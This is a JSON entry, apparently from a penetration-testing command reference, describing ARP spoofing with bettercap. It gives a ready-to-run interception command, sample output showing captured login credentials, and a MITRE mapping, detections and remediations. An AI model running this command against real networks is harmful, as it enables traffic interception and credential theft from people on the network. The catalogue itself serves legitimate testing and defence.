  {
    "id": "bettercap-arp-spoof",
    "tool": "bettercap",
    "category": "wireless",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "bettercap -iface eth0 -eval 'set arp.spoof.targets <victim_ip>; arp.spoof on; net.sniff on'",
    "name": "ARP Spoofing (MITM)",
    "description": "Performs ARP spoofing to intercept traffic between victim and gateway.",
    "arguments": {
      "arp.spoof.targets": "Victim IP",
      "arp.spoof on": "Start spoofing",
      "net.sniff on": "Capture traffic"
    },
    "expected_output": "[*] ARP spoofing active\n[*] Captured: HTTP POST /login user=admin&pass=secret",
    "use_case": "Intercept network traffic to capture credentials and sensitive data.",
    "prerequisites": [
      "Same network segment",
      "Root privileges"
    ],
    "mitre_mapping": [
      "T1557.002"
    ],
    "mitre_tactic": "Credential Access",
    "detections": [
      "Duplicate ARP entries",
      "Unusual ARP traffic"
    ],
    "remediation": [
      "Static ARP entries",
      "Dynamic ARP Inspection",
      "HTTPS everywhere"
    ],
    "common_mistakes": [
      "Target uses HTTPS (encrypted)"
    ],
    "alternatives": [
      "arpspoof",
      "ettercap"
    ],
    "references": [
      "https://www.bettercap.org"
    ],
    "tags": [
      "arp",
      "spoofing",
      "mitm",
      "sniffing",
      "network"
    ]
  },
